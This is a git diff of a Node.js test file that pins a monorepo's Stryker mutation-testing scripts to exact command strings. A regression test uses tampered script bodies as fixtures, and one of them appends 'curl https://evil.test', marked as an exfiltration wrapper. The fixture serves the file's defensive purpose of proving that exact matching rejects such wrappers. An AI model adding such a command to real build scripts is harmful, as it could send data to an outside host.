@@ -3,15 +3,30 @@ import { readFile } from 'node:fs/promises';
 import { test } from 'node:test';
 
 /**
- * Escape every RegExp metacharacter in a string so it can be embedded as a
- * literal inside `new RegExp(...)`. Escapes backslash too, so no input byte can
- * introduce an unintended escape sequence (CodeQL js/incomplete-sanitization).
+ * The exact command a `test:mutate:<pkg>` script must run: a single
+ * `pnpm --filter <filter> exec stryker run` with no wrapper, echo, or nested
+ * delegation. `extra` appends contract flags (e.g. ` --dryRunOnly`).
  *
- * @param {string} literal - the string to embed literally in a pattern.
- * @returns {string} the metacharacter-escaped string.
+ * The tests compare a script body for equality against this — not a
+ * substring/regex match — on purpose: a wrapped body like
+ * `echo x && <canonical> && …` contains the canonical command but must fail.
+ *
+ * @param {string} filter - the `@rundown-org/*` workspace filter.
+ * @param {string} [extra] - trailing contract flags, including a leading space.
+ * @returns {string} the exact expected script body.
  */
-function escapeRegExp(literal) {
-  return literal.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+function scopedStrykerRun(filter, extra = '') {
+  return `pnpm --filter ${filter} exec stryker run${extra}`;
+}
+
+/**
+ * The exact `run-s` fan-out the `test:mutate` aggregate must be: every
+ * per-package script, in `perPackage` order, and nothing else.
+ *
+ * @returns {string} the exact expected aggregate script body.
+ */
+function aggregateScript() {
+  return `run-s ${perPackage.map(({ pkg }) => `test:mutate:${pkg}`).join(' ')}`;
 }
 
 /**
@@ -61,14 +76,12 @@ test('no test:mutate:* root script carries a trailing `--`', async () => {
 // path) or fails loudly — never silently unscoped. It is also the exact form
 // CLAUDE.md documents as canonical.
 for (const { pkg, filter } of perPackage) {
-  test(`test:mutate:${pkg} uses the \`--filter ${filter} exec stryker run\` form`, async () => {
+  test(`test:mutate:${pkg} is exactly \`pnpm --filter ${filter} exec stryker run\``, async () => {
     const scripts = await rootScripts();
-    const body = scripts[`test:mutate:${pkg}`];
-    assert.ok(body, `test:mutate:${pkg} script must exist`);
-    assert.match(
-      body,
-      new RegExp(`--filter\\s+${escapeRegExp(filter)}\\s+exec\\s+stryker\\s+run`),
-      `test:mutate:${pkg} must invoke \`pnpm --filter ${filter} exec stryker run\` (not a nested \`--filter … <script>\` that mangles forwarded scoping args)`,
+    assert.equal(
+      scripts[`test:mutate:${pkg}`],
+      scopedStrykerRun(filter),
+      `test:mutate:${pkg} must be exactly \`pnpm --filter ${filter} exec stryker run\` — no wrapper, echo, or nested \`--filter … <script>\` delegation that mangles forwarded scoping args`,
     );
   });
 }
@@ -78,29 +91,50 @@ for (const { pkg, filter } of perPackage) {
 // not the old nested `--filter … test:mutate:dry` that mangles forwarded args.
 // The trailing-`--` guard above already covers it; this pins the positive shape
 // so the `--dryRunOnly` flag can never regress to a foot-gun-prone delegation.
-test('test:mutate:cli:dry uses the `--filter @rundown-org/cli exec stryker run --dryRunOnly` form', async () => {
+test('test:mutate:cli:dry is exactly `pnpm --filter @rundown-org/cli exec stryker run --dryRunOnly`', async () => {
   const scripts = await rootScripts();
-  const body = scripts['test:mutate:cli:dry'];
-  assert.ok(body, 'test:mutate:cli:dry script must exist');
-  assert.match(
-    body,
-    new RegExp(
-      `--filter\\s+${escapeRegExp('@rundown-org/cli')}\\s+exec\\s+stryker\\s+run\\s+--dryRunOnly`,
-    ),
-    'test:mutate:cli:dry must invoke `pnpm --filter @rundown-org/cli exec stryker run --dryRunOnly` (not a nested `--filter … <script>` that mangles forwarded scoping args)',
+  assert.equal(
+    scripts['test:mutate:cli:dry'],
+    scopedStrykerRun('@rundown-org/cli', ' --dryRunOnly'),
+    'test:mutate:cli:dry must be exactly `pnpm --filter @rundown-org/cli exec stryker run --dryRunOnly` — the base scoped-exec shape plus the --dryRunOnly contract flag, no wrapper or nested delegation',
   );
 });
 
-// The aggregate must fan out to every per-package script so a bare
-// `pnpm run test:mutate` still runs the whole campaign.
-test('test:mutate aggregate runs every per-package script', async () => {
+// The aggregate must fan out to every per-package script via `run-s` so a bare
+// `pnpm run test:mutate` runs the whole campaign — and nothing else. Exact match
+// rejects a body that merely mentions the sub-scripts (e.g. inside an echo) or
+// drops the canonical `run-s` runner.
+test('test:mutate aggregate is exactly `run-s` over every per-package script', async () => {
   const scripts = await rootScripts();
-  const aggregate = scripts['test:mutate'];
-  assert.ok(aggregate, 'test:mutate aggregate script must exist');
-  for (const { pkg } of perPackage) {
-    assert.ok(
-      aggregate.includes(`test:mutate:${pkg}`),
-      `test:mutate aggregate must include test:mutate:${pkg}`,
-    );
+  assert.equal(
+    scripts['test:mutate'],
+    aggregateScript(),
+    'test:mutate must be exactly the canonical `run-s test:mutate:parser test:mutate:core test:mutate:cli test:mutate:plugin` fan-out',
+  );
+});
+
+// Regression pin (issue #551 review): the assertions above use exact-string
+// comparison, not a substring/regex match. This proves that choice has teeth —
+// each tampered body embeds the canonical command (so the old `.includes()` /
+// `assert.match()` checks would have PASSED it) yet must be rejected.
+test('exact-shape assertions reject wrappers a substring match would accept', () => {
+  const canonical = scopedStrykerRun('@rundown-org/cli');
+  const wrapped = [
+    `echo building && ${canonical}`, // prefix wrapper
+    `${canonical} && curl https://evil.test`, // suffix wrapper / exfil
+    `${canonical} --dryRunOnly`, // extra flag outside the base contract
+    `${canonical} && ${canonical}`, // duplicated invocation
+  ];
+  for (const body of wrapped) {
+    // Precondition: a substring/regex check (the old approach) would ACCEPT it…
+    assert.ok(body.includes(canonical), `precondition: ${body} contains the canonical command`);
+    // …but the exact-equality contract the tests now use REJECTS it.
+    assert.notEqual(body, canonical, `exact match must reject wrapped body: ${body}`);
   }
+
+  // Same tightening for the aggregate: a mere echo mentioning the sub-scripts
+  // must not pass the exact `run-s …` contract.
+  const aggregate = aggregateScript();
+  assert.ok(`echo "${aggregate}"`.includes(aggregate), 'precondition: echo mentions the aggregate');
+  assert.notEqual(`echo "${aggregate}"`, aggregate);
 });
